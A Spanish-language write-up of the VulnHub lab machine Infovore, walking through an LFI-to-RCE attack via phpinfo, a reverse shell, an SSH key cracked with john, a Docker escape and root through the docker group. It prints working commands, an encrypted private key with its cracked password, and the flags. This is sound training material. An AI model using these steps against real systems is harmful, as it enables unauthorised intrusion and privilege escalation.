---
title: "Infovore: 1 - Write-Up - VulnHub"
description: "Infovore: 1 - Write-Up - VulnHub"
pubDatetime: 2023-09-04
tags: ["fácil", "vulnhub", "lfi2rce", "docker breakout", "docker privesc"]
---

Hay 4 flags en esta máquina.

> Tengo la máquina corriendo con la siguiente IP asignada por DHCP: `192.168.18.144`.

# Reconocimiento

Para empezar realizamos un escaneo de puertos con nmap.

```bash
❯ nmap -A -p- --open 192.168.18.144

# Nmap 7.94 scan initiated Fri Sep  1 03:59:27 2023 as: nmap -A -p80 -oN target 192.168.18.144
Nmap scan report for 192.168.18.144
Host is up (0.00050s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Include me ...
MAC Address: 74:DF:BF:5B:54:D3 (Liteon Technology)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.18.144

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep  1 03:59:36 2023 -- 1 IP address (1 host up) scanned in 8.69 seconds
```

Solo hay un puerto abierto por TCP, el 80. Así que la intrusión tiene que ser por aquí sí o sí.

## Reconocimiento web

![](@assets/VulnHub/infovore/index.png)

Con gobuster encontramos una ruta interesante: `info.php`.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.18.144 -t 200 -x php,txt -o webScan

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.18.144
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 4743]
/img                  (Status: 301) [Size: 314] [--> http://192.168.18.144/img/]
/css                  (Status: 301) [Size: 314] [--> http://192.168.18.144/css/]
/vendor               (Status: 301) [Size: 317] [--> http://192.168.18.144/vendor/]
/info.php             (Status: 200) [Size: 69783]
```

En este hay una página mostrando el típico output de ejecutar un `phpinfo()`.

![](@assets/VulnHub/infovore/info.png)

Normalmente al ver el output de un `phpinfo()` nos interesa buscar por variables de entorno (enviroment) por si hay alguna que leekee datos o por funciones interesantes que estén habilitadas.

## LFI2RCE via phpinfo

En este caso el servidor tiene `file_uploads = true` lo que podríamos explotar para intentar acontecer un RCE como se explica aquí: [lfi2rce via phpinfo](https://github.com/TheSnowWight/hackdocs/blob/master/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.md).

![](@assets/VulnHub/infovore/uploads.png)

Como dice en la página necesitamos ciertos requisitos.

> To exploit this vulnerability you need: A LFI vulnerability, a page where phpinfo() is displayed, "file_uploads = on" and the server has to be able to write in the "/tmp" directory.

### LFI

El `phpinfo` ya lo tenemos así que pasamos a buscar el LFI. Probamos fuzzeando el la ruta principal con `gobuster`.

```bash
❯ gobuster fuzz -w "/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt" -u "http://192.168.18.144/?FUZZ=/etc/passwd" --exclude-length 4743 -t 100 -o fuzzing
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://192.168.18.144/?FUZZ=/etc/passwd
[+] Method:           GET
[+] Threads:          100
[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Exclude Length:   4743
[+] User Agent:       gobuster/3.6
[+] Timeout:          10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=1006] [Word=filename] http://192.168.18.144/?filename=/etc/passwd

Progress: 1185254 / 1185255 (100.00%)
===============================================================
Finished
===============================================================
```

Encuentro que el parámetro `filename` existe y nos permite acceder a rutas internas del sistema.

### Subida de archivos

Ahora tenemos que subir archivos para comprobar si podemos escribir en `/tmp`, para eso tendremos que hacer lo siguiente para subir "archivos" con una petición en BurpSuite.

Para esto tenemos que hacer lo siguiente.

1. Interceptar una petición del `phpinfo` y cambiar el método de GET a POST.

2. Eliminar los headers `Content-Type` y `Content-Length` (si están) y añadir el siguiente header: `Content-Type: multipart/form-data; boundary=--test`

3. Añadir lo siguiente en el cuerpo de la petición:

```
----test
Content-Disposition: form-data; name="test"; filename="test.txt"
Content-Type: text/plain

testing123
----test
```

![](@assets/VulnHub/infovore/request.png)

En la respuesta comprobamos que el archivo se ha subido efectivamente a una ruta bajo `/tmp`.

![](@assets/VulnHub/infovore/upload_check.png)

Pero al intentar visualizarlo con el LFI de antes no existe. Esto es porque el servidor borra los archivos temporales automáticamente tras checkearlos.

# Intrusión

Una vez encontrados los vectores necesarios nos clonamos el script.

```bash
❯ wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py
```

Y tenemos que realizar una serie de retoques.

1. Primero hay que correr el siguiente comando sobre el exploit: `sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py`. Esto es para cambiar el `=>` por un `=&gt` para poder filtrar correctamente en la respuesta a la petición
   .

![](@assets/VulnHub/infovore/greater.png)

2. Tenemos que cambiar el payload a una reverse shell.

![](@assets/VulnHub/infovore/revshell.png)

3. Cambiar las rutas vulnerables. (REQ1 -> `/info.php`, LFIREQ -> `/?filename`)

![](@assets/VulnHub/infovore/lfi.png)

Ahora nos ponemos en escucha, corremos el script con `python2` y deberíamos tener shell.

![](@assets/VulnHub/infovore/access.png)

Tenemos primera flag.

```bash
www-data@e71b67461f6c:/var/www/html$ cat .user.txt
FLAG{Now_You_See_phpinfo_not_so_harmless}
```

## Docker breakout

Estamos dentro como el usuario `www-data` pero al hacer un `hostname -I` no aparece la IP de la máquina víctima y existe un archivo `.dockerenv` en la ruta del sistema, lo que me hace pensar que estamos en un contenedor.

![](@assets/VulnHub/infovore/container.png)

Nos llama la atención en la raíz del sistema un archivo oculto `.oldkeys.tgz`. Lo descomprimimos y contiene dos archivos.

![](@assets/VulnHub/infovore/tarxf.png)

Al parecer son un par de claves para SSH. En un principio la máquina a vulnerar no tenía SSH corriendo por ningún puerto abierto así realizamos un escaneo de puertos desde el contenedor para comprobar si está abierto internamente.

> Como el contenedor tiene asignada la IP `192.168.150.21` intuyo que la máquina principal tiene otra interfaz de red con la IP `192.168.150.1` asignada aparte de la `192.168.18.144`.

```bash
www-data@e71b67461f6c:/$ hostname -i
192.168.150.21
www-data@e71b67461f6c:/$ for port in $(seq 1 65535);do echo '' > /dev/tcp/192.168.150.1/$port && echo "[+] PORT $port - OPEN"; done 2>/dev/null
[+] PORT 22 - OPEN
[+] PORT 80 - OPEN
```

Como vemos con el escaneo si que está corriendo SSH así intento crackear la clave privada para intentar conectarme.

```bash
❯ cat id_rsa
-----BEGIN DSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2037F380706D4511A1E8D114860D9A0E

ds7T1dLfxm7o0NC93POQLLjptTjMMFVJ4qxNlO2Xt+rBqgAG7YQBy6Tpj2Z2VxZb
uyMe0vMyIpN9jNFeOFbL42RYrMV0V50VTd/s7pYqrp8hHYWdX0+mMfKfoG8UaqWy
gBdYisUpRpmyVwG1zQQF1Tl7EnEWkH1EW6LOA9hGg6DrotcqWHiofiuNdymPtlN+
it/uUVfSli+BNRqzGsN01creG0g9PL6TfS0qNTkmeYpWxt7Y+/R+3pyaTBHG8hEe
zZcX24qvW1KY2ArpSSKYlXZw+BwR5CLk6S/9UlW4Gls9YRK7Jl4mzBGdtpP85a/p
fLowmWKRmqCw2EH87mZUKYaf02w1jbVWyjXOy8SwNCNr87zJstQpmgOISUc7Cknq
JEpv1kzXEVJCfeeA1163du4RFfETFauxALtKLylAqMs4bqcOJm1NVuHAmJdz4+VT
GRSmO/+B+LNLiGJm9/7aVFGi95kuoxFstIkG3HWVodYLE/FUbVqOjqsIBJxoK3rB
t75Yskdgr3QU9vkEGTZWbI3lYNrF0mDTiqNHKjsoiekhSaUBM80nAdEfHzSs2ySW
EQDd4Hf9/Ln3w5FThvUf+g==
-----END DSA PRIVATE KEY-----

❯ ssh2john id_rsa > hash

❯ john -w:/usr/share/seclists/rockyou.txt hash
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 50.54% (ETA: 08:42:49) 0g/s 1451Kp/s 1451Kc/s 1451KC/s imnotgay1996..imnoteliza
choclate93       (id_rsa)
Warning: Only 1 candidate left, minimum 4 needed for performance.
1g 0:00:00:09 DONE (2023-09-03 08:42) 0.1048g/s 1503Kp/s 1503Kc/s 1503KC/s *7¡Vamos!
Session completed
```

Tenemos contraseña: **choclate93**.

Intento conectarme pero al parecer no puedo añadir la IP al archivo `known_hosts`. Después de probar un rato encuentro que la contraseña se reutiliza para el usuario root del contenedor.

Tenemos segunda flag.

```bash
root@e71b67461f6c:~# cat /root/root.txt
FLAG{Congrats_on_owning_phpinfo_hope_you_enjoyed_it}

And onwards and upwards!
```

Una vez como root en el contenedor, tenemos en la ruta `/root/.ssh` otro par de claves SSH. Vemos en la clave pública que pertenecen al usuario **admin** de la máquina host.

```bash
root@e71b67461f6c:~/.ssh# ls -la
total 20
drwx------ 2 root root 4096 Jun 23  2020 .
drwx------ 4 root root 4096 Sep  4 08:42 ..
-rw------- 1 root root 1766 Jun 22  2020 id_rsa
-rw-r--r-- 1 root root  401 Jun 22  2020 id_rsa.pub
-rw-r--r-- 1 root root  222 Jun 23  2020 known_hosts
root@e71b67461f6c:~/.ssh# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDN/keLDJowDdeSdHZz26wS1M2o2/eiJ99+acchRJr0lZE0YmqbfoIo+n75VS+eLiT03yonunkVp+lhK+uey7/Tu8JsQSHK1F0gci5FG7MKRU4/+m+0CODwVFTNgw3E4FKg5qu+nt6BkBThU3Vnhe/Ujbp5ruNjb4pPajll2Pv5dyRfaRrn0DTnhpBdeXWdIhU9QQgtxzmUXed/77rV6m4AL4+iENigp3YcPOjF7zUG/NEop9c1wdGpjSEhv/ftjyKoazFEmOI1SGpD3k9VZlIUFs/uw6kRVDJlg9uxT4Pz0tIEMVizlV4oZgcEyOJ9NkSe6ePUAHG7F+v7VjbYdbVh admin@192.168.150.1
```

Nos loguemos mediante SSH y tenemos shell en la máquina host como **admin**.

![](@assets/VulnHub/infovore/user.png)

Tenemos tercera flag.

```bash
admin@infovore:~$ cat /home/admin/admin.txt
FLAG{Escaped_from_D0ck3r}
```

# Escalada de privilegios con docker

Vemos de primeras con `id` que estamos en el grupo `docker`. Lo que significa que podemos manipular y gestionar contenedores en la máquina.

```bash
admin@infovore:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin),999(docker)
```

Para escalar privilegios perteneciendo al grup `docker` es muy sencillo, simplemente hay que desplegar un contenedor desde una imagen cualquiera con la raíz del sistema montada a este.

```bash
admin@infovore:~$ docker images -a
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
<none>              <none>              2b60cdccf518        3 years ago         428MB
theart42/infovore   latest              40de379c5116        3 years ago         428MB
<none>              <none>              f44ca16c21f7        3 years ago         428MB
<none>              <none>              8163972900d5        3 years ago         428MB
<none>              <none>              7a399b907ce9        3 years ago         420MB
<none>              <none>              02c0c04dfa72        3 years ago         420MB
<none>              <none>              31dfc99fbf7e        3 years ago         420MB
<none>              <none>              77c1bf5b4475        3 years ago         414MB
```

Vemos que existe una imagen disponible (**theart42/infovore**) que podemos aprovechar para crear nuestro contenedor.

Una vez dentro del contenedor, me dirijo a la ruta donde he montado el sistema `/mnt` y otorgo el bit SUID al binario en `/mnt/bin/bash`.

![](@assets/VulnHub/infovore/privesc.png)

Tenemos cuarta y última flag.

```bash
bash-4.3# cat /root/root.txt
 _____                             _       _
/  __ \                           | |     | |
| /  \/ ___  _ __   __ _ _ __ __ _| |_ ___| |
| |    / _ \| '_ \ / _` | '__/ _` | __/ __| |
| \__/\ (_) | | | | (_| | | | (_| | |_\__ \_|
 \____/\___/|_| |_|\__, |_|  \__,_|\__|___(_)
                    __/ |
                   |___/
__   __                                         _   _        __                         _
\ \ / /                                        | | (_)      / _|                       | |
 \ V /___  _   _   _ ____      ___ __   ___  __| |  _ _ __ | |_ _____   _____  _ __ ___| |
  \ // _ \| | | | | '_ \ \ /\ / / '_ \ / _ \/ _` | | | '_ \|  _/ _ \ \ / / _ \| '__/ _ \ |
  | | (_) | |_| | | |_) \ V  V /| | | |  __/ (_| | | | | | | || (_) \ V / (_) | | |  __/_|
  \_/\___/ \__,_| | .__/ \_/\_/ |_| |_|\___|\__,_| |_|_| |_|_| \___/ \_/ \___/|_|  \___(_)
                  | |
                  |_|

FLAG{And_now_You_are_done}

@theart42 and @4nqr34z
```

Ahora en nuestra máquina host con un simple `bash -p` tenemos shell como root.

![](@assets/VulnHub/infovore/root.png)

# Referencias

- [https://stackoverflow.com/questions/3508338/what-is-the-boundary-in-multipart-form-data](https://stackoverflow.com/questions/3508338/what-is-the-boundary-in-multipart-form-data)
- [https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo)
- [https://youtu.be/rs4zEwONzzk?si=xofMqPiOxfyiKcZO](https://youtu.be/rs4zEwONzzk?si=xofMqPiOxfyiKcZO)
- [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
